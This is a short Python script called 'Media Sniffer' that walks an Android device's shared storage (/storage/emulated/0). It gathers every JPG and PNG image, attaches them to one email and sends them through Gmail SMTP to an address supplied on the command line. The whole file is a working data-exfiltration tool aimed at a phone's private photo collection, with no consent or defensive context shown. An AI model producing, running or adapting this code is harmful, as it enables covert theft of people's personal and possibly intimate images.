import email, smtplib, ssl, os, sys

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

port = 465  # For SSL
sender = "sender email"
password = "your password"
receiver = "receiver email"
subject = "Python: Media Sniffer"

if len(sys.argv) == 2:
	receiver = sys.argv[1]
elif len(sys.argv) == 4:
	sender = sys.argv[1]
	password = sys.argv[2]
	receiver = sys.argv[3]
	
message = MIMEMultipart()
message["From"] = sender
message["To"] = receiver
message["Subject"] = subject

PATH = "/storage/emulated/0"
images = []

for (root, dirs, files) in os.walk(PATH):
	for file in files:
		if file.endswith(".jpg") or file.endswith(".png"):
			images.append(root + "/" + file)
			
for image in images:
	with open(image, "rb") as attachment:
		part = MIMEBase("application", "octet-stream")
		part.set_payload(attachment.read())
		encoders.encode_base64(part)
		part.add_header(
		"Content-Disposition",
		f"attachment; filename= {image}",
		)
		message.attach(part)

text = message.as_string()
# Create a secure SSL context
context = ssl.create_default_context()

with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
    server.login(sender, password)
    server.sendmail(sender, receiver, text)